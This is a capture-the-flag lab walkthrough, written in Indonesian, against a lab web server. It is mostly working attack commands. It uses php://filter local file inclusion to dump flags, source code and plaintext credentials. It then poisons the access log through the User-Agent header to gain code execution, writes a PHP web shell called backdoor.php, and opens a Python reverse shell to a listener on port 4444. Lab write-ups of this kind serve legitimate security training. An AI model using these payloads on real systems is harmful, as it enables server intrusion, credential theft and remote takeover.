# LFI 
- cari flag di /etc/flag
	- `curl -s http://10.10.146.35/index.php?err=php://filter/convert.base64-encode/resource=/etc/flag`
	- VEhNe2QyOWUwODk0MWNmN2ZlNDFkZjU1ZjFhN2RhNmM0YzA2

- cari $flag di index.php
	- `curl -s http://10.10.146.35/index.php?err=php://filter/convert.base64-encode/resource=index.php`
	- `PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY`

- cari creds dari hint di index.php
	- `curl -s http://10.10.146.35/index.php\?err\=php://filter/convert.base64-encode/resource\=manage.php`
		- `PD9waHAgCnNlc3Npb25fc3RhcnQoKTsKaW5jbHVkZSgnLi9pbmNsdWRlcy9jcmVkcy5waHAnKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddICE9ICRVU0VSKXsKICAgICAga GVhZGVyKCJMb2NhdGlvbjogbG9naW4ucGhwIik7CiAgICAgIGRpZSgpOwogIH0gZWxzZSB7CgkgICRsYWJOdW0gPSAiTWFuYWdlIjsKCSAgcmVxdWlyZSAiLi9pbmNsdWRlcy 9oZWFkZXIucGhwIjsKICB9Cj8+Cgo8ZGl2IGNsYXNzPSJyb3ciPgogIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+CiAgICAgIDw/cGhwIGlmIChpc3NldCgkZXJyb3IpKSB7ID8 +CiAgICAgICAgICA8c3BhbiBjbGFzcz0idGV4dCB0ZXh0LWRhbmdlciI+PGI+PD9waHAgZWNobyAkZXJyb3I7ID8+PC9iPjwvc3Bhbj4KICAgICAgPD9waHAgfSA/PgogICAg PHA+SGkgPD9waHAgZWNobyAkX1NFU1NJT05bJ3VzZXJuYW1lJ107ID8+PC9wPgo8cD5UbyByZWNvdmVyIGEgc3lzdGVtJ3MgYWNjZXNzIHBhc3N3b3JkOjxwPgo8dWw+Cjxsa T48YSBocmVmPSIuL3JlY292ZXItcGFzc3dvcmQucGhwIj5QYXNzd29yZCBSZWNvdmVyeTwvYT48L2xpPgo8bGk+PGEgaHJlZj0iLi9sb2dzLnBocCI+TG9nIEFjY2VzczwvYT 48L2xpPgo8bGk+PGEgaHJlZj0iLi9sb2dvdXQucGhwIj5Mb2dvdXQ8L2E+PC9saT4KPC91bD4K`
	- `curl -s http://10.10.146.35/index.php\?err\=php://filter/convert.base64-encode/resource\=./includes/creds.php`
	- `PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/`
	- `McSkidy:A0C315Aw3s0m`


# LFI ke RCE menggunakan log poisoning

- Login ke web server dengan creds `McSkidy:A0C315Aw3s0m`

- pergi ke `http://Target/logs.php` dimana berisi log request yang dilakukan setiap saat ke web server

- `log file` diproses di tempat lain (dalam hal ini ada di `./includes/llogs/app_access.log`) dan akan dirender di `http://Target/llogs.php`

- gunakan curl untuk coba modify User-Agent `curl -A "Cookieee" http://Target/index.php`

- cek pada `http://Target/llogs.php`, dan kita akan melihat 

```
...
Guest:IP-address:Cookieee:/index.php
...
```

- selanjutnya coba untuk mengganti User-Agent menjadi code php `curl -A "<?php phpinfo()?>" http://Target/index.php` sebagai PoC bahwa kita dapat melakukan log poisoning. Lalu refresh `http://Target/llogs.php`, akan melihat

```
...
Guest:IP-address::/index.php
...
```

- untuk melihat hasilnya, kita perlu melakukan LFI seperti sebelumnya (bisa buka window baru untuk browser), lalu pergi ke `curl -s http://10.10.146.35/index.php?err=./includes/log/app_access.log` seperti yang sudah di mention pada pertanyaan (`./includes/log/app_access.log`) dimana kita tidak naik keatas dir, kita akan lebih masuk ke dir. kita akan mendapat PHP info dibagian paling bawah.

- reset log pada window lama yang telah login menggunakan creds.

- lakukan lagi `curl` untuk edit User-Agent dengan seperti berikut `curl -A "<?php echo 'wkwkwklmao       ';system(\$_GET['cmd']);?>" http://Target/index.php` dan selanjutnya jalankan curl tersebut.

- Selanjutnya kita perlu pergi dengan LFI ke web root dir yang mana biasanya terdapat di `/var/www/html/` dan lebih lengkapnya, kita perlu untuk mengakses file log dengan LFI tersebut, jadi untuk full URL LFI yang akan digunakan adalah seperti berikut `http://Target/index.php?err=../../../../../../../../../../../../var/www/html/includes/log/app_access.log` dan hasilnya

```
Guest:IP-address:wkwkwklmao
Warning
: system()[
	function.system
]: Cannot execute a blank command in
/var/www/html/includes/logs/app_access.log
...
```

- dari hasil proses tersebut, dapat kita lihat bahwa kita sekarang dapat memasukkan command melalui url dengan cara `http://Target/index.php?err=../../../../../../../../../../../../var/www/html/includes/log/app_access.log&cmd=whoami` dengan hasilnya

```
Guest:IP-address:wkwkwklmao www-data:/index.php ...
```

- sebenarnya sampai stage ini sudah bisa, namun pada real word, jika kita hanya berhenti sampai stage ini, nantinya akan terlalu convoluted hasilnya. sehingga kita dapat melanjutkan untuk RCE ke stage berikutnya `http://Target/index.php?err=../../../../../../../../../../../../var/www/html/includes/log/app_access.log&cmd=echo '<?php echo 'wkwkwklmao       ';system(\$_GET['cmd']);?>' > backdoor.php`, dimana LFI kali ini akan membuat file baru yang mana akan digunakan untuk RCE yaitu `backdoor.php`.

- selanjutnya, kita buka tab baru dengan `http://Target/backdoor.php` bukan `index.php`. Kita dapat menggunakannya seperti pada stage sebelumnya `http://Target/backdoor.php?cmd=id`. Selanjutnya kita dapat melakukan revshell dengan python karena ketika di cek dengan `...cmd=which python`, sebelum itu kita perlu siapkan listener ncat `nc -lvnp 4444`, selanjutnya kita dapat result `/usr/bin/python`. kita dapat menggunakan cara dari [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) seperti berikut

```
http://Target/backdoor.php?cmd=python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

- terakhir setelah mendapat revshell, kita bisa mencari tahu nama hostname dengan command `hostname`